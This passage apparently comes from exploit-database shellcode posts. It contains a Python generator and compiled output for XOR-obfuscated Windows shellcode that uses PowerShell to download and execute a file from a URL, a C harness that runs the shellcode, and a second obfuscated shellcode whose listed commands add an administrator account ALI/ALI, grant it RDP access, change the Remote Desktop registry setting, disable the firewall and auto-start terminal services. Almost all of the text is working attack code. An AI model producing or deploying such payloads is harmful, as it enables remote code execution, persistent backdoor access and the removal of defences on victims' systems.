#Title: Obfuscated Shellcode Windows x86/x64 Download And Execute [Use PowerShell] - Generator
#length: Dynamic ! depend on url and filename
#Date: 20 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x64 ultimate
#WinExec =>  0x77b1e695
#ExitProcess =>  0x77ae2acf
#====================================
#Execute :
#powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe', 'D:\Ali.exe')};D:\Ali.exe"
#====================================
#Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']
#Thanks to my friends , Dariush Nasirpour and Ehsan Nezami
####################################################
#How it work ?
'''
C:\Users\Ali\Desktop>python "Windows x86 Download And Execute.py"
Enter url
Example: http://z3r0d4y.com/file.exe
Enter:http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe
Enter filename
Example: D:\file.exe
Enter:C:\Ali.exe
C:\Users\Ali\Desktop>nasm -f elf shellcode.asm -o shellcode.o
C:\Users\Ali\Desktop>objdump -D shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 41 41 65 22          push   $0x22654141
   8:   58                      pop    %eax
   9:   c1 e8 08                shr    $0x8,%eax
   c:   c1 e8 08                shr    $0x8,%eax
   f:   50                      push   %eax
  10:   b8 34 47 0b 4d          mov    $0x4d0b4734,%eax
  15:   bb 5d 69 6e 35          mov    $0x356e695d,%ebx
  1a:   31 d8                   xor    %ebx,%eax
  1c:   50                      push   %eax
  1d:   b8 43 32 10 22          mov    $0x22103243,%eax
  22:   bb 79 6e 51 4e          mov    $0x4e516e79,%ebx
  27:   31 d8                   xor    %ebx,%eax
  29:   50                      push   %eax
  2a:   b8 60 05 42 32          mov    $0x32420560,%eax
  2f:   bb 49 78 79 71          mov    $0x71797849,%ebx
  34:   31 d8                   xor    %ebx,%eax
  36:   50                      push   %eax
  37:   b8 0f 1c 2c 14          mov    $0x142c1c0f,%eax
  3c:   bb 6a 64 49 33          mov    $0x3349646a,%ebx
  41:   31 d8                   xor    %ebx,%eax
  43:   50                      push   %eax
  44:   b8 07 3e 0b 40          mov    $0x400b3e07,%eax
  49:   bb 46 52 62 6e          mov    $0x6e625246,%ebx
  4e:   31 d8                   xor    %ebx,%eax
  50:   50                      push   %eax
  51:   b8 44 0a 78 07          mov    $0x7780a44,%eax
  56:   bb 63 49 42 5b          mov    $0x5b424963,%ebx
  5b:   31 d8                   xor    %ebx,%eax
  5d:   50                      push   %eax
  5e:   b8 0f 16 4b 0d          mov    $0xd4b160f,%eax
  63:   bb 6a 31 67 2d          mov    $0x2d67316a,%ebx
  68:   31 d8                   xor    %ebx,%eax
  6a:   50                      push   %eax
  6b:   b8 18 62 5c 1f          mov    $0x1f5c6218,%eax
  70:   bb 61 4c 39 67          mov    $0x67394c61,%ebx
  75:   31 d8                   xor    %ebx,%eax
  77:   50                      push   %eax
  78:   b8 1b 2d 1e 1f          mov    $0x1f1e2d1b,%eax
  7d:   bb 6b 58 6a 6b          mov    $0x6b6a586b,%ebx
  82:   31 d8                   xor    %ebx,%eax
  84:   50                      push   %eax
  85:   b8 45 40 41 66          mov    $0x66414045,%eax
  8a:   bb 3d 78 77 49          mov    $0x4977783d,%ebx
  8f:   31 d8                   xor    %ebx,%eax
  91:   50                      push   %eax
  92:   b8 02 1f 4b 45          mov    $0x454b1f02,%eax
  97:   bb 6d 6b 38 6a          mov    $0x6a386b6d,%ebx
  9c:   31 d8                   xor    %ebx,%eax
  9e:   50                      push   %eax
  9f:   b8 24 3e 19 32          mov    $0x32193e24,%eax
  a4:   bb 45 4e 6a 5a          mov    $0x5a6a4e45,%ebx
  a9:   31 d8                   xor    %ebx,%eax
  ab:   50                      push   %eax
  ac:   b8 00 5e 3a 35          mov    $0x353a5e00,%eax
  b1:   bb 6c 73 49 5b          mov    $0x5b49736c,%ebx
  b6:   31 d8                   xor    %ebx,%eax
  b8:   50                      push   %eax
  b9:   b8 1f 37 40 24          mov    $0x2440371f,%eax
  be:   bb 6d 52 32 41          mov    $0x4132526d,%ebx
  c3:   31 d8                   xor    %ebx,%eax
  c5:   50                      push   %eax
  c6:   b8 2e 35 68 31          mov    $0x3168352e,%eax
  cb:   bb 5a 4c 45 41          mov    $0x41454c5a,%ebx
  d0:   31 d8                   xor    %ebx,%eax
  d2:   50                      push   %eax
  d3:   b8 48 1e 1c 15          mov    $0x151c1e48,%eax
  d8:   bb 67 6e 69 61          mov    $0x61696e67,%ebx
  dd:   31 d8                   xor    %ebx,%eax
  df:   50                      push   %eax
  e0:   b8 26 28 0d 5d          mov    $0x5d0d2826,%eax
  e5:   bb 4f 45 62 33          mov    $0x3362454f,%ebx
  ea:   31 d8                   xor    %ebx,%eax
  ec:   50                      push   %eax
  ed:   b8 20 57 1d 45          mov    $0x451d5720,%eax
  f2:   bb 47 78 63 36          mov    $0x36637847,%ebx
  f7:   31 d8                   xor    %ebx,%eax
  f9:   50                      push   %eax
  fa:   b8 04 6a 24 3b          mov    $0x3b246a04,%eax
  ff:   bb 77 44 4b 49          mov    $0x494b4477,%ebx
 104:   31 d8                   xor    %ebx,%eax
 106:   50                      push   %eax
 107:   b8 18 0f 0a 32          mov    $0x320a0f18,%eax
 10c:   bb 6c 6e 78 47          mov    $0x47786e6c,%ebx
 111:   31 d8                   xor    %ebx,%eax
 113:   50                      push   %eax
 114:   b8 7d 18 3c 27          mov    $0x273c187d,%eax
 119:   bb 52 6c 5d 55          mov    $0x555d6c52,%ebx
 11e:   31 d8                   xor    %ebx,%eax
 120:   50                      push   %eax
 121:   b8 03 44 60 60          mov    $0x60604403,%eax
 126:   bb 77 34 5a 4f          mov    $0x4f5a3477,%ebx
 12b:   31 d8                   xor    %ebx,%eax
 12d:   50                      push   %eax
 12e:   b8 47 6b 1f 20          mov    $0x201f6b47,%eax
 133:   bb 6f 4c 77 54          mov    $0x54774c6f,%ebx
 138:   31 d8                   xor    %ebx,%eax
 13a:   50                      push   %eax
 13b:   b8 2a 5e 2b 20          mov    $0x202b5e2a,%eax
 140:   bb 6c 37 47 45          mov    $0x4547376c,%ebx
 145:   31 d8                   xor    %ebx,%eax
 147:   50                      push   %eax
 148:   b8 59 07 12 0e          mov    $0xe120759,%eax
 14d:   bb 35 68 73 6a          mov    $0x6a736835,%ebx
 152:   31 d8                   xor    %ebx,%eax
 154:   50                      push   %eax
 155:   b8 01 59 11 2c          mov    $0x2c115901,%eax
 15a:   bb 45 36 66 42          mov    $0x42663645,%ebx
 15f:   31 d8                   xor    %ebx,%eax
 161:   50                      push   %eax
 162:   b8 22 22 4e 5a          mov    $0x5a4e2222,%eax
 167:   bb 4c 56 67 74          mov    $0x7467564c,%ebx
 16c:   31 d8                   xor    %ebx,%eax
 16e:   50                      push   %eax
 16f:   b8 00 37 1b 48          mov    $0x481b3700,%eax
 174:   bb 43 5b 72 2d          mov    $0x2d725b43,%ebx
 179:   31 d8                   xor    %ebx,%eax
 17b:   50                      push   %eax
 17c:   b8 4a 1f 22 13          mov    $0x13221f4a,%eax
 181:   bb 64 48 47 71          mov    $0x71474864,%ebx
 186:   31 d8                   xor    %ebx,%eax
 188:   50                      push   %eax
 189:   b8 6a 23 03 18          mov    $0x1803236a,%eax
 18e:   bb 4a 6d 66 6c          mov    $0x6c666d4a,%ebx
 193:   31 d8                   xor    %ebx,%eax
 195:   50                      push   %eax
 196:   b8 2d 54 57 1c          mov    $0x1c57542d,%eax
 19b:   bb 47 31 34 68          mov    $0x68343147,%ebx
 1a0:   31 d8                   xor    %ebx,%eax
 1a2:   50                      push   %eax
 1a3:   b8 4e 15 36 5a          mov    $0x5a36154e,%eax
 1a8:   bb 39 38 79 38          mov    $0x38793839,%ebx
 1ad:   31 d8                   xor    %ebx,%eax
 1af:   50                      push   %eax
 1b0:   b8 59 7f 1f 04          mov    $0x41f7f59,%eax
 1b5:   bb 79 57 51 61          mov    $0x61515779,%ebx
 1ba:   31 d8                   xor    %ebx,%eax
 1bc:   50                      push   %eax
 1bd:   b8 47 56 1d 2f          mov    $0x2f1d5647,%eax
 1c2:   bb 65 70 3d 54          mov    $0x543d7065,%ebx
 1c7:   31 d8                   xor    %ebx,%eax
 1c9:   50                      push   %eax
 1ca:   b8 2c 18 08 54          mov    $0x5408182c,%eax
 1cf:   bb 4d 76 6c 74          mov    $0x746c764d,%ebx
 1d4:   31 d8                   xor    %ebx,%eax
 1d6:   50                      push   %eax
 1d7:   b8 5a 34 58 1b          mov    $0x1b58345a,%eax
 1dc:   bb 39 5b 35 76          mov    $0x76355b39,%ebx
 1e1:   31 d8                   xor    %ebx,%eax
 1e3:   50                      push   %eax
 1e4:   b8 3f 0f 4b 41          mov    $0x414b0f3f,%eax
 1e9:   bb 53 63 6b 6c          mov    $0x6c6b6353,%ebx
 1ee:   31 d8                   xor    %ebx,%eax
 1f0:   50                      push   %eax
 1f1:   b8 4a 1e 59 0b          mov    $0xb591e4a,%eax
 1f6:   bb 38 6d 31 6e          mov    $0x6e316d38,%ebx
 1fb:   31 d8                   xor    %ebx,%eax
 1fd:   50                      push   %eax
 1fe:   b8 49 2b 16 2a          mov    $0x2a162b49,%eax
 203:   bb 39 44 61 4f          mov    $0x4f614439,%ebx
 208:   31 d8                   xor    %ebx,%eax
 20a:   50                      push   %eax
 20b:   89 e0                   mov    %esp,%eax
 20d:   bb 41 41 41 01          mov    $0x1414141,%ebx
 212:   c1 eb 08                shr    $0x8,%ebx
 215:   c1 eb 08                shr    $0x8,%ebx
 218:   c1 eb 08                shr    $0x8,%ebx
 21b:   53                      push   %ebx
 21c:   50                      push   %eax
 21d:   bb 95 e6 b1 77          mov    $0x77b1e695,%ebx
 222:   ff d3                   call   *%ebx
 224:   bb cf 2a ae 77          mov    $0x77ae2acf,%ebx
 229:   ff d3                   call   *%ebx
C:\Users\Ali\Desktop>
#you have your shellcode now
=======================================
shellcode.c
#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\x68\x41\x41\x65\x22\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb8\x34\x47\x0b\x4d\xbb\x5d\x69\x6e\x35\x31\xd8\x50\xb8\x43\x32\x10\x22\xbb\x79\x6e\x51\x4e\x31\xd8\x50\xb8\x60\x05\x42\x32\xbb\x49\x78\x79\x71\x31\xd8\x50\xb8\x0f\x1c\x2c\x14\xbb\x6a\x64\x49\x33\x31\xd8\x50\xb8\x07\x3e\x0b\x40\xbb\x46\x52\x62\x6e\x31\xd8\x50\xb8\x44\x0a\x78\x07\xbb\x63\x49\x42\x5b\x31\xd8\x50\xb8\x0f\x16\x4b\x0d\xbb\x6a\x31\x67\x2d\x31\xd8\x50\xb8\x18\x62\x5c\x1f\xbb\x61\x4c\x39\x67\x31\xd8\x50\xb8\x1b\x2d\x1e\x1f\xbb\x6b\x58\x6a\x6b\x31\xd8\x50\xb8\x45\x40\x41\x66\xbb\x3d\x78\x77\x49\x31\xd8\x50\xb8\x02\x1f\x4b\x45\xbb\x6d\x6b\x38\x6a\x31\xd8\x50\xb8\x24\x3e\x19\x32\xbb\x45\x4e\x6a\x5a\x31\xd8\x50\xb8\x00\x5e\x3a\x35\xbb\x6c\x73\x49\x5b\x31\xd8\x50\xb8\x1f\x37\x40\x24\xbb\x6d\x52\x32\x41\x31\xd8\x50\xb8\x2e\x35\x68\x31\xbb\x5a\x4c\x45\x41\x31\xd8\x50\xb8\x48\x1e\x1c\x15\xbb\x67\x6e\x69\x61\x31\xd8\x50\xb8\x26\x28\x0d\x5d\xbb\x4f\x45\x62\x33\x31\xd8\x50\xb8\x20\x57\x1d\x45\xbb\x47\x78\x63\x36\x31\xd8\x50\xb8\x04\x6a\x24\x3b\xbb\x77\x44\x4b\x49\x31\xd8\x50\xb8\x18\x0f\x0a\x32\xbb\x6c\x6e\x78\x47\x31\xd8\x50\xb8\x7d\x18\x3c\x27\xbb\x52\x6c\x5d\x55\x31\xd8\x50\xb8\x03\x44\x60\x60\xbb\x77\x34\x5a\x4f\x31\xd8\x50\xb8\x47\x6b\x1f\x20\xbb\x6f\x4c\x77\x54\x31\xd8\x50\xb8\x2a\x5e\x2b\x20\xbb\x6c\x37\x47\x45\x31\xd8\x50\xb8\x59\x07\x12\x0e\xbb\x35\x68\x73\x6a\x31\xd8\x50\xb8\x01\x59\x11\x2c\xbb\x45\x36\x66\x42\x31\xd8\x50\xb8\x22\x22\x4e\x5a\xbb\x4c\x56\x67\x74\x31\xd8\x50\xb8\x00\x37\x1b\x48\xbb\x43\x5b\x72\x2d\x31\xd8\x50\xb8\x4a\x1f\x22\x13\xbb\x64\x48\x47\x71\x31\xd8\x50\xb8\x6a\x23\x03\x18\xbb\x4a\x6d\x66\x6c\x31\xd8\x50\xb8\x2d\x54\x57\x1c\xbb\x47\x31\x34\x68\x31\xd8\x50\xb8\x4e\x15\x36\x5a\xbb\x39\x38\x79\x38\x31\xd8\x50\xb8\x59\x7f\x1f\x04\xbb\x79\x57\x51\x61\x31\xd8\x50\xb8\x47\x56\x1d\x2f\xbb\x65\x70\x3d\x54\x31\xd8\x50\xb8\x2c\x18\x08\x54\xbb\x4d\x76\x6c\x74\x31\xd8\x50\xb8\x5a\x34\x58\x1b\xbb\x39\x5b\x35\x76\x31\xd8\x50\xb8\x3f\x0f\x4b\x41\xbb\x53\x63\x6b\x6c\x31\xd8\x50\xb8\x4a\x1e\x59\x0b\xbb\x38\x6d\x31\x6e\x31\xd8\x50\xb8\x49\x2b\x16\x2a\xbb\x39\x44\x61\x4f\x31\xd8\x50\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\x95\xe6\xb1\x77\xff\xd3\xbb\xcf\x2a\xae\x77\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}
=======================================
C:\Users\Ali\Desktop>gcc shellcode.c -o shellcode.exe
C:\Users\Ali\Desktop>shellcode.exe
Length: 173
C:\Users\Ali\Desktop>
#notice : when program exit, you must wait 2-3 second , it will finish download and execute file after 2-3 second 
'''
import random,binascii
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789=[]-'
p1 = '''xor eax,eax
push eax 
'''
p2 = '''
mov eax,esp
mov ebx,0x01414141
shr ebx,0x08
shr ebx,0x08
shr ebx,0x08
push ebx
push eax
mov ebx,0x77b1e695
call ebx
mov ebx,0x77ae2acf
call ebx
'''
sen1 = str(raw_input('Enter url\nExample: http://z3r0d4y.com/file.exe \nEnter:'))
sen1 = sen1.rsplit()
sen1 = sen1[0]
sen2 = str(raw_input('Enter filename\nExample: D:\\file.exe\nEnter:'))
sen2 = sen2.rsplit()
sen2 = sen2[0]
sen = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s')};%s"''' %(sen1,sen2,sen2)
m = 0
for word in sen:
        m += 1
m = m - 1
stack = ''
while(m>=0):
        stack += sen[m]
        m -= 1
stack = stack.encode('hex')
skip = 1
if len(stack) % 8 == 0:
        skip = 0
if skip is 1:
        stack = '00' + stack
        if len(stack) % 8 == 0:
                skip = 0
        if skip is 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
        if skip is 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
if len(stack) % 8 == 0:
        zxzxzxz = 0
m = len(stack) / 8
c = 0
n = 0
z = 8
shf = open('shellcode.asm','w')
shf.write(p1)
shf.close()
shf = open('shellcode.asm','a')
while(c<m):
        v = 'push 0x' + stack[n:z]
        skip = 0
        if '0x000000' in v:
                skip = 1
                q1 = v[13:]
                v = 'push 0x' + q1 + '414141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x0000' in v:
                skip = 1
                q1 = v[11:]
                v = 'push 0x' + q1 + '4141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x00' in v:
                skip = 1
                q1 = v[9:]
                v = 'push 0x' + q1 + '41' + '\n' + 'pop eax\nshr eax,0x08\npush eax\n'
        if skip is 1:
                shf.write(v)
        if skip is 0:
                v = v.rsplit()
                zzz = ''
                for w in v:
                        if '0x' in w:
                                zzz = str(w)
                s1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
                s1 = '0x%s'%s1
                data = "%x" % (int(zzz, 16) ^ int(s1, 16))
                v =  'mov eax,0x%s\nmov ebx,%s\nxor eax,ebx\npush eax\n'%(data,s1)
                shf.write(v)
        n += 8
        z += 8
        c += 1
shf.write(p2)
shf.close()


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
#Title: Obfuscated Shellcode Windows x64 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]
#length: 1218 bytes
#Date: 13 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x64 ultimate

WinExec =>  0x769e2c91
ExitProcess =>  0x769679f8
====================================
Execute :
net user ALI ALI /add
net localgroup Administrators ALI /add
NET LOCALGROUP "Remote Desktop Users" ALI /add  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
netsh firewall set opmode disable
sc config termservice start= auto
====================================



Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']

Thanks to my friends , Dariush Nasirpour and Ehsan Nezami


C:\Users\Ali\Desktop>objdump -D shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   b8 41 41 41 64          mov    $0x64414141,%eax
   8:   c1 e8 08                shr    $0x8,%eax
   b:   c1 e8 08                shr    $0x8,%eax
   e:   c1 e8 08                shr    $0x8,%eax
  11:   50                      push   %eax
  12:   b9 6d 76 53 52          mov    $0x5253766d,%ecx
  17:   ba 4d 59 32 36          mov    $0x3632594d,%edx
  1c:   31 d1                   xor    %edx,%ecx
  1e:   51                      push   %ecx
  1f:   b9 6e 72 61 71          mov    $0x7161726e,%ecx
  24:   ba 4e 33 2d 38          mov    $0x382d334e,%edx
  29:   31 d1                   xor    %edx,%ecx
  2b:   51                      push   %ecx
  2c:   b9 6c 75 78 78          mov    $0x7878756c,%ecx
  31:   ba 4c 34 34 31          mov    $0x3134344c,%edx
  36:   31 d1                   xor    %edx,%ecx
  38:   51                      push   %ecx
  39:   b9 46 47 57 46          mov    $0x46574746,%ecx
  3e:   ba 33 34 32 34          mov    $0x34323433,%edx
  43:   31 d1                   xor    %edx,%ecx
  45:   51                      push   %ecx
  46:   b9 56 50 47 64          mov    $0x64475056,%ecx
  4b:   ba 38 35 33 44          mov    $0x44333538,%edx
  50:   31 d1                   xor    %edx,%ecx
  52:   51                      push   %ecx
  53:   89 e0                   mov    %esp,%eax
  55:   bb 41 41 41 01          mov    $0x1414141,%ebx
  5a:   c1 eb 08                shr    $0x8,%ebx
  5d:   c1 eb 08                shr    $0x8,%ebx
  60:   c1 eb 08                shr    $0x8,%ebx
  63:   53                      push   %ebx
  64:   50                      push   %eax
  65:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
  6a:   ba 4d 56 36 55          mov    $0x5536564d,%edx
  6f:   31 d3                   xor    %edx,%ebx
  71:   ff d3                   call   *%ebx
  73:   31 c0                   xor    %eax,%eax
  75:   50                      push   %eax
  76:   68 41 41 64 64          push   $0x64644141
  7b:   58                      pop    %eax
  7c:   c1 e8 08                shr    $0x8,%eax
  7f:   c1 e8 08                shr    $0x8,%eax
  82:   50                      push   %eax
  83:   b9 01 41 60 32          mov    $0x32604101,%ecx
  88:   ba 48 61 4f 53          mov    $0x534f6148,%edx
  8d:   31 d1                   xor    %edx,%ecx
  8f:   51                      push   %ecx
  90:   b9 28 47 0d 2f          mov    $0x2f0d4728,%ecx
  95:   ba 5b 67 4c 63          mov    $0x634c675b,%edx
  9a:   31 d1                   xor    %edx,%ecx
  9c:   51                      push   %ecx
  9d:   b9 03 24 36 21          mov    $0x21362403,%ecx
  a2:   ba 62 50 59 53          mov    $0x53595062,%edx
  a7:   31 d1                   xor    %edx,%ecx
  a9:   51                      push   %ecx
  aa:   b9 34 41 15 18          mov    $0x18154134,%ecx
  af:   ba 5d 32 61 6a          mov    $0x6a61325d,%edx
  b4:   31 d1                   xor    %edx,%ecx
  b6:   51                      push   %ecx
  b7:   b9 0c 05 1b 25          mov    $0x251b050c,%ecx
  bc:   ba 68 68 72 4b          mov    $0x4b726868,%edx
  c1:   31 d1                   xor    %edx,%ecx
  c3:   51                      push   %ecx
  c4:   b9 2f 27 7b 13          mov    $0x137b272f,%ecx
  c9:   ba 5a 57 5b 52          mov    $0x525b575a,%edx
  ce:   31 d1                   xor    %edx,%ecx
  d0:   51                      push   %ecx
  d1:   b9 1c 2c 02 3e          mov    $0x3e022c1c,%ecx
  d6:   ba 70 4b 70 51          mov    $0x51704b70,%edx
  db:   31 d1                   xor    %edx,%ecx
  dd:   51                      push   %ecx
  de:   b9 3d 2a 32 4c          mov    $0x4c322a3d,%ecx
  e3:   ba 51 45 51 2d          mov    $0x2d514551,%edx
  e8:   31 d1                   xor    %edx,%ecx
  ea:   51                      push   %ecx
  eb:   b9 23 5c 1c 19          mov    $0x191c5c23,%ecx
  f0:   ba 4d 39 68 39          mov    $0x3968394d,%edx
  f5:   31 d1                   xor    %edx,%ecx
  f7:   51                      push   %ecx
  f8:   89 e0                   mov    %esp,%eax
  fa:   bb 41 41 41 01          mov    $0x1414141,%ebx
  ff:   c1 eb 08                shr    $0x8,%ebx
 102:   c1 eb 08                shr    $0x8,%ebx
 105:   c1 eb 08                shr    $0x8,%ebx
 108:   53                      push   %ebx
 109:   50                      push   %eax
 10a:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
 10f:   ba 4d 56 36 55          mov    $0x5536564d,%edx
 114:   31 d3                   xor    %edx,%ebx
 116:   ff d3                   call   *%ebx
 118:   31 c0                   xor    %eax,%eax
 11a:   50                      push   %eax
 11b:   68 41 41 64 64          push   $0x64644141
 120:   58                      pop    %eax
 121:   c1 e8 08                shr    $0x8,%eax
 124:   c1 e8 08                shr    $0x8,%eax
 127:   50                      push   %eax
 128:   b9 02 63 6b 35          mov    $0x356b6302,%ecx
 12d:   ba 4b 43 44 54          mov    $0x5444434b,%edx
 132:   31 d1                   xor    %edx,%ecx
 134:   51                      push   %ecx
 135:   b9 61 55 6c 3d          mov    $0x3d6c5561,%ecx
 13a:   ba 43 75 2d 71          mov    $0x712d7543,%edx
 13f:   31 d1                   xor    %edx,%ecx
 141:   51                      push   %ecx
 142:   b9 27 3f 3b 1a          mov    $0x1a3b3f27,%ecx
 147:   ba 54 5a 49 69          mov    $0x69495a54,%edx
 14c:   31 d1                   xor    %edx,%ecx
 14e:   51                      push   %ecx
 14f:   b9 25 34 12 67          mov    $0x67123425,%ecx
 154:   ba 4a 44 32 32          mov    $0x3232444a,%edx
 159:   31 d1                   xor    %edx,%ecx
 15b:   51                      push   %ecx
 15c:   b9 0b 02 1f 19          mov    $0x191f020b,%ecx
 161:   ba 6e 71 74 6d          mov    $0x6d74716e,%edx
 166:   31 d1                   xor    %edx,%ecx
 168:   51                      push   %ecx
 169:   b9 39 3f 7b 15          mov    $0x157b3f39,%ecx
 16e:   ba 4d 5a 5b 51          mov    $0x515b5a4d,%edx
 173:   31 d1                   xor    %edx,%ecx
 175:   51                      push   %ecx
 176:   b9 35 15 03 2a          mov    $0x2a031535,%ecx
 17b:   ba 67 70 6e 45          mov    $0x456e7067,%edx
 180:   31 d1                   xor    %edx,%ecx
 182:   51                      push   %ecx
 183:   b9 3a 17 75 46          mov    $0x4675173a,%ecx
 188:   ba 6f 47 55 64          mov    $0x6455476f,%edx
 18d:   31 d1                   xor    %edx,%ecx
 18f:   51                      push   %ecx
 190:   b9 26 35 0b 1e          mov    $0x1e0b3526,%ecx
 195:   ba 6a 72 59 51          mov    $0x5159726a,%edx
 19a:   31 d1                   xor    %edx,%ecx
 19c:   51                      push   %ecx
 19d:   b9 2a 2a 06 2a          mov    $0x2a062a2a,%ecx
 1a2:   ba 66 65 45 6b          mov    $0x6b456566,%edx
 1a7:   31 d1                   xor    %edx,%ecx
 1a9:   51                      push   %ecx
 1aa:   b9 1d 20 35 5a          mov    $0x5a35201d,%ecx
 1af:   ba 53 65 61 7a          mov    $0x7a616553,%edx
 1b4:   31 d1                   xor    %edx,%ecx
 1b6:   51                      push   %ecx
 1b7:   89 e0                   mov    %esp,%eax
 1b9:   bb 41 41 41 01          mov    $0x1414141,%ebx
 1be:   c1 eb 08                shr    $0x8,%ebx
 1c1:   c1 eb 08                shr    $0x8,%ebx
 1c4:   c1 eb 08                shr    $0x8,%ebx
 1c7:   53                      push   %ebx
 1c8:   50                      push   %eax
 1c9:   bb dc 7a a8 23          mov    $0x23a87adc,%ebx
 1ce:   ba 4d 56 36 55          mov    $0x5536564d,%edx
 1d3:   31 d3                   xor    %edx,%ebx
 1d5:   ff d3                   call   *%ebx
 1d7:   31 c0                   xor    %eax,%eax
 1d9:   50                      push   %eax
 1da:   b9 09 4c 7c 5e          mov    $0x5e7c4c09,%ecx
 1df:   ba 38 6c 53 38          mov    $0x38536c38,%edx
 1e4:   31 d1                   xor    %edx,%ecx
 1e6:   51                      push   %ecx
 1e7:   b9 42 4d 39 14          mov    $0x14394d42,%ecx
 1ec:   ba 62 62 5d 34          mov    $0x345d6262,%edx
 1f1:   31 d1                   xor    %edx,%ecx
 1f3:   51                      push   %ecx
 1f4:   b9 7a 24 26 75          mov    $0x7526247a,%ecx
 1f9:   ba 2d 6b 74 31          mov    $0x31746b2d,%edx
 1fe:   31 d1                   xor    %edx,%ecx
 200:   51                      push   %ecx
 201:   b9 1d 30 15 28          mov    $0x2815301d,%ecx
 206:   ba 58 77 4a 6c          mov    $0x6c4a7758,%edx
 20b:   31 d1                   xor    %edx,%ecx
 20d:   51                      push   %ecx
 20e:   b9 7c 2f 57 16          mov    $0x16572f7c,%ecx
 213:   ba 53 5b 77 44          mov    $0x44775b53,%edx
 218:   31 d1                   xor    %edx,%ecx
 21a:   51                      push   %ecx
 21b:   b9 42 25 2a 66          mov    $0x662a2542,%ecx
 220:   ba 2d 4b 59 46          mov    $0x46594b2d,%edx
 225:   31 d1                   xor    %edx,%ecx
 227:   51                      push   %ecx
 228:   b9 28 2f 0c 5a          mov    $0x5a0c2f28,%ecx
 22d:   ba 4d 4c 78 33          mov    $0x33784c4d,%edx
 232:   31 d1                   xor    %edx,%ecx
 234:   51                      push   %ecx
 235:   b9 20 2b 26 26          mov    $0x26262b20,%ecx
 23a:   ba 63 44 48 48          mov    $0x48484463,%edx
 23f:   31 d1                   xor    %edx,%ecx
 241:   51                      push   %ecx
 242:   b9 08 2b 23 67          mov    $0x67232b08,%ecx
 247:   ba 66 52 77 34          mov    $0x34775266,%edx
 24c:   31 d1                   xor    %edx,%ecx
 24e:   51                      push   %ecx
 24f:   b9 49 1c 2e 48          mov    $0x482e1c49,%ecx
 254:   ba 69 7a 6a 2d          mov    $0x2d6a7a69,%edx
 259:   31 d1                   xor    %edx,%ecx
 25b:   51                      push   %ecx
 25c:   b9 67 67 1d 37          mov    $0x371d6767,%ecx
 261:   ba 45 47 32 41          mov    $0x41324745,%edx
 266:   31 d1                   xor    %edx,%ecx
 268:   51                      push   %ecx
 269:   b9 03 33 0d 3b          mov    $0x3b0d3303,%ecx
 26e:   ba 71 45 68 49          mov    $0x49684571,%edx
 273:   31 d1                   xor    %edx,%ecx
 275:   51                      push   %ecx
 276:   b9 39 6a 3c 2f          mov    $0x2f3c6a39,%ecx
 27b:   ba 55 4a 6f 4a          mov    $0x4a6f4a55,%edx
 280:   31 d1                   xor    %edx,%ecx
 282:   51                      push   %ecx
 283:   b9 37 44 1f 2e          mov    $0x2e1f4437,%ecx
 288:   ba 5a 2d 71 4f          mov    $0x4f712d5a,%edx
 28d:   31 d1                   xor    %edx,%ecx
 28f:   51                      push   %ecx
 290:   b9 34 23 23 3b          mov    $0x3b232334,%ecx
 295:   ba 68 77 46 49          mov    $0x49467768,%edx
 29a:   31 d1                   xor    %edx,%ecx
 29c:   51                      push   %ecx
 29d:   b9 07 3a 0a 14          mov    $0x140a3a07,%ecx
 2a2:   ba 73 48 65 78          mov    $0x78654873,%edx
 2a7:   31 d1                   xor    %edx,%ecx
 2a9:   51                      push   %ecx
 2aa:   b9 14 2e 58 53          mov    $0x53582e14,%ecx
 2af:   ba 48 6d 37 3d          mov    $0x3d376d48,%edx
 2b4:   31 d1                   xor    %edx,%ecx
 2b6:   51                      push   %ecx
 2b7:   b9 3e 3d 26 32          mov    $0x32263d3e,%ecx
 2bc:   ba 52 6e 43 46          mov    $0x46436e52,%edx
 2c1:   31 d1                   xor    %edx,%ecx
 2c3:   51                      push   %ecx
 2c4:   b9 33 3c 35 34          mov    $0x34353c33,%ecx
 2c9:   ba 5d 48 47 5b          mov    $0x5b47485d,%edx
 2ce:   31 d1                   xor    %edx,%ecx
 2d0:   51                      push   %ecx
 2d1:   b9 36 0e 07 2b          mov    $0x2b070e36,%ecx
 2d6:   ba 58 7a 44 44          mov    $0x44447a58,%edx
 2db:   31 d1                   xor    %edx,%ecx
 2dd:   51                      push   %ecx
 2de:   b9 3c 10 0a 37          mov    $0x370a103c,%ecx
 2e3:   ba 49 62 78 52          mov    $0x52786249,%edx
